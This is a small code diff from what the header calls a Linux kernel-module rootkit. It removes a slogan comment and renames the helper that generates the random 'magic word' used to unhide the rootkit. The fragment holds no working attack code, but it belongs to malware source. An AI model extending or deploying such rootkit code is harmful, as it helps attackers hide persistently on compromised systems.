@@ -15,8 +15,6 @@
  *
  * LKM rootkit by @hash
  *
- * 'The virus has mutated into dictatorship'
- *
  */
 #include <linux/module.h>
 #include <linux/version.h>
@@ -342,7 +340,7 @@ out_put_kobj:
 static char *get_unhide_magic_word(void) {
     static char *magic_word;
     if(!magic_word)
-        magic_word = kv_whatever_random_AZ_string(MAX_MAGIC_WORD_SIZE);
+        magic_word = kv_util_random_AZ_string(MAX_MAGIC_WORD_SIZE);
 
     /* magic_word must be freed later */
     return magic_word;
